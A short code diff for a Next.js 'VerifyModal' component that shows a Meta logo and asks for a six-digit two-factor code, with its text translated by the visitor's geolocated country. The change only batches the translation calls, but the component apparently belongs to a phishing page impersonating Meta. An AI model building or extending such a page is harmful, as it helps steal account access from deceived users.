@@ -2,7 +2,7 @@ import MetaLogo from '@/assets/images/meta-logo-image.png';
 import VerifyImage from '@/assets/images/verify-image.png';
 import { store } from '@/store/store';
 import config from '@/utils/config';
-import translateText from '@/utils/translate';
+import { translateBatch } from '@/utils/translate';
 import axios from 'axios';
 import Image from 'next/image';
 import { useEffect, useState, type FC } from 'react';
@@ -29,12 +29,7 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         const textsToTranslate = ['Check your authentication code', 'Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).', 'Code', "This code doesn't work. Check it's correct or try a new one after", 'Continue'];
 
         const translateAll = async () => {
-            const translatedMap: Record<string, string> = {};
-
-            for (const text of textsToTranslate) {
-                translatedMap[text] = await translateText(text, geoInfo.country_code);
-            }
-
+            const translatedMap = await translateBatch(textsToTranslate, geoInfo.country_code);
             setTranslations(translatedMap);
         };
 
